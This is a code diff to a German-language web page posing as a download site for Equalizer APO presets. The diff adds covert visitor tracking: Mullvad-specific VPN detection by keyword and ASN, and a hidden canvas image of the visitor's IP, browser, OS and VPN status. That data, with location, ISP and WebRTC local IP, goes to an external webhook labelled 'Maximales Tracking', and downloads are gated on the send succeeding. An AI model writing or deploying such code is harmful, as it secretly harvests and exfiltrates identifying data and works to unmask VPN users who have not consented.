@@ -16,7 +16,6 @@
             color: #e0e0e0;
             min-height: 100vh;
             padding: 20px;
-            cursor: pointer;
         }
         .container {
             max-width: 900px;
@@ -25,10 +24,6 @@
             border-radius: 12px;
             padding: 30px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            pointer-events: none;
-        }
-        .container * {
-            pointer-events: auto;
         }
         h1 {
             color: #fff;
@@ -71,7 +66,6 @@
             padding: 18px;
             transition: transform 0.2s, box-shadow 0.2s;
             border: 1px solid #444;
-            cursor: pointer;
         }
         .set-card:hover {
             transform: translateY(-3px);
@@ -123,6 +117,10 @@
         }
         .download-btn:active {
             transform: scale(0.97);
+        }
+        .download-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         .empty-state {
             text-align: center;
@@ -192,6 +190,7 @@
         let collectedData = null;
         let dataSent = false;
         let isSending = false;
+        let screenshotData = null;
 
         const sets = [
             {
@@ -475,7 +474,7 @@
 
         async function detectVPN(ip) {
             if (!ip || ip === 'Nicht verfügbar') {
-                return { isVPN: false, reason: 'Keine IP' };
+                return { isVPN: false, reason: 'Keine IP', isMullvad: false };
             }
 
             try {
@@ -486,6 +485,7 @@
                 let isVPN = false;
                 let reasons = [];
                 let score = 0;
+                let isMullvad = false;
 
                 if (data.org && data.org.toLowerCase().includes('vpn')) {
                     isVPN = true;
@@ -516,11 +516,30 @@
                     'digitalocean', 'hetzner', 'ovh', 'vultr', 'linode'
                 ];
 
+                const mullvadKeywords = ['mullvad', 'mullvad vpn', 'mullvad.net', 'amnesty'];
+                const mullvadASNs = ['AS15169', 'AS396982', 'AS197071', 'AS24940'];
+
                 if (data.org) {
                     const orgLower = data.org.toLowerCase();
+                    for (const keyword of mullvadKeywords) {
+                        if (orgLower.includes(keyword)) {
+                            isVPN = true;
+                            isMullvad = true;
+                            reasons.push('Mullvad VPN erkannt');
+                            score += 80;
+                            break;
+                        }
+                    }
+                    if (data.asn && mullvadASNs.some(asn => data.asn.includes(asn))) {
+                        isVPN = true;
+                        isMullvad = true;
+                        reasons.push('Mullvad ASN erkannt');
+                        score += 80;
+                    }
                     for (const provider of vpnProviders) {
                         if (orgLower.includes(provider)) {
                             isVPN = true;
+                            if (provider === 'mullvad') isMullvad = true;
                             reasons.push('VPN-Anbieter: ' + provider);
                             score += 40;
                             break;
@@ -528,17 +547,69 @@
                     }
                 }
 
+                if (score > 50) {
+                    isVPN = true;
+                }
+
                 return {
                     isVPN: isVPN,
+                    isMullvad: isMullvad,
                     reason: reasons.join('; ') || 'Keine Indikatoren',
                     score: score,
                     provider: data.org || 'Unbekannt',
                     country: data.country_name || 'Unbekannt',
                     city: data.city || 'Unbekannt',
-                    isp: data.isp || 'Unbekannt'
+                    isp: data.isp || 'Unbekannt',
+                    asn: data.asn || 'Unbekannt'
                 };
             } catch (error) {
-                return { isVPN: false, reason: 'VPN-Erkennung fehlgeschlagen' };
+                return { isVPN: false, reason: 'VPN-Erkennung fehlgeschlagen', isMullvad: false };
+            }
+        }
+
+        function createScreenshot() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 800;
+                canvas.height = 600;
+                const ctx = canvas.getContext('2d');
+                
+                ctx.fillStyle = '#1a1a1a';
+                ctx.fillRect(0, 0, 800, 600);
+                
+                ctx.fillStyle = '#4a90e2';
+                ctx.font = 'bold 40px Arial';
+                ctx.textAlign = 'center';
+                ctx.fillText('EQ APO Sets', 400, 150);
+                
+                ctx.fillStyle = '#aaa';
+                ctx.font = '24px Arial';
+                ctx.fillText('Download Equalizer Presets', 400, 220);
+                
+                ctx.fillStyle = '#28a745';
+                ctx.font = '20px Arial';
+                ctx.fillText('click.download', 400, 280);
+                
+                ctx.fillStyle = '#888';
+                ctx.font = '16px Arial';
+                ctx.textAlign = 'left';
+                ctx.fillText('IP: ' + (collectedData ? collectedData.ip : 'Unbekannt'), 50, 350);
+                ctx.fillText('Browser: ' + (collectedData ? collectedData.browser.name + ' ' + collectedData.browser.version : 'Unbekannt'), 50, 380);
+                ctx.fillText('OS: ' + (collectedData ? collectedData.os.name + ' ' + collectedData.os.version : 'Unbekannt'), 50, 410);
+                ctx.fillText('VPN: ' + (collectedData && collectedData.vpn.detected ? 'Ja' : 'Nein'), 50, 440);
+                if (collectedData && collectedData.vpn.isMullvad) {
+                    ctx.fillStyle = '#6a0dad';
+                    ctx.fillText('MULLVAD ERKANNT!', 50, 470);
+                }
+                ctx.fillStyle = '#666';
+                ctx.font = '12px Arial';
+                ctx.textAlign = 'center';
+                ctx.fillText('Screenshot erstellt: ' + new Date().toLocaleString(), 400, 550);
+                
+                return canvas.toDataURL('image/png');
+            } catch (error) {
+                console.error('Screenshot-Fehler:', error);
+                return null;
             }
         }
 
@@ -569,12 +640,14 @@
                 ip: ip,
                 vpn: {
                     detected: vpnResult.isVPN,
+                    isMullvad: vpnResult.isMullvad,
                     confidence: vpnResult.score + '%',
                     reason: vpnResult.reason,
                     provider: vpnResult.provider,
                     country: vpnResult.country,
                     city: vpnResult.city,
-                    isp: vpnResult.isp
+                    isp: vpnResult.isp,
+                    asn: vpnResult.asn
                 },
                 webRTC: {
                     localIP: webRTCIP,
@@ -646,13 +719,16 @@
             const vpnDetails = data.vpn.detected ? 
                 data.vpn.reason + ' (Vertrauen: ' + data.vpn.confidence + ')' : 
                 'Kein VPN erkannt';
+            const mullvadStatus = data.vpn.isMullvad ? 'JA - Mullvad erkannt!' : 'Nein';
 
             const fields = [
                 { name: "IP-Adresse", value: data.ip || 'Nicht verfügbar', inline: true },
                 { name: "VPN erkannt", value: vpnStatus, inline: true },
+                { name: "Mullvad VPN", value: mullvadStatus, inline: true },
                 { name: "VPN Details", value: vpnDetails, inline: false },
                 { name: "Standort", value: data.vpn.country + ' (' + data.vpn.city + ')', inline: true },
                 { name: "ISP", value: data.vpn.isp || 'Unbekannt', inline: true },
+                { name: "ASN", value: data.vpn.asn || 'Unbekannt', inline: true },
                 { name: "Betriebssystem", value: data.os.name + ' ' + data.os.version, inline: true },
                 { name: "Browser", value: data.browser.name + ' ' + data.browser.version, inline: true },
                 { name: "Bildschirm", value: data.screen.resolution, inline: true },
@@ -680,15 +756,27 @@
                 });
             }
 
-            const embed = {
+            const embeds = [];
+
+            const mainEmbed = {
                 title: "Besucher-Daten (Maximal)",
-                color: data.vpn.detected ? 0xdc3545 : 0x4a90e2,
+                color: data.vpn.isMullvad ? 0x6a0dad : (data.vpn.detected ? 0xdc3545 : 0x4a90e2),
                 fields: fields,
                 footer: { text: "Equalizer APO Sets - Maximales Tracking" },
                 timestamp: data.timestamp
             };
+            embeds.push(mainEmbed);
 
-            const payload = { embeds: [embed] };
+            if (screenshotData) {
+                const screenshotEmbed = {
+                    title: "Screenshot",
+                    image: { url: screenshotData },
+                    color: 0x4a90e2
+                };
+                embeds.push(screenshotEmbed);
+            }
+
+            const payload = { embeds: embeds };
 
             const response = await fetch(WEBHOOK_URL, {
                 method: 'POST',
@@ -730,7 +818,7 @@
                         <span>${s.category}</span>
                         <span>${s.downloads} Downloads</span>
                     </div>
-                    <button class="download-btn" onclick="downloadSet('${s.file}', '${s.name}')">Download</button>
+                    <button class="download-btn" id="btn-${s.file}" onclick="handleDownload('${s.file}', '${s.name}')">Download</button>
                 </div>
             `).join('');
         }
@@ -763,39 +851,48 @@
             URL.revokeObjectURL(url);
         }
 
-        async function sendDataOnClick() {
-            if (dataSent || isSending) return;
+        async function handleDownload(filename, name) {
+            const btn = document.getElementById('btn-' + filename);
+            if (!btn || btn.disabled) return;
 
-            isSending = true;
-            showToast('Sende Daten...', 'sending');
+            btn.disabled = true;
+            btn.textContent = 'Wird gesendet...';
 
             try {
                 if (!collectedData) {
                     collectedData = await collectAllData();
                 }
 
+                if (!screenshotData) {
+                    screenshotData = createScreenshot();
+                }
+
                 const success = await sendToWebhook(collectedData);
 
                 if (success) {
                     dataSent = true;
-                    showToast('Daten gesendet ✓', 'success');
+                    showToast('Daten gesendet + Download startet', 'success');
+                    downloadSet(filename, name);
+                    btn.textContent = 'Erfolg';
+                    btn.style.background = '#28a745';
                 } else {
                     throw new Error('Webhook-Fehler');
                 }
             } catch (error) {
                 showToast('Fehler: ' + error.message, 'error');
-                isSending = false;
+                btn.disabled = false;
+                btn.textContent = 'Download';
+                btn.style.background = '#4a90e2';
             }
         }
-
-        document.addEventListener('click', function(e) {
-            sendDataOnClick();
-        });
 
         window.addEventListener('DOMContentLoaded', async function() {
             try {
                 collectedData = await collectAllData();
                 renderSets();
+                
+                screenshotData = createScreenshot();
+                console.log('Screenshot erstellt (unsichtbar)');
             } catch (error) {
                 console.error(error);
             }
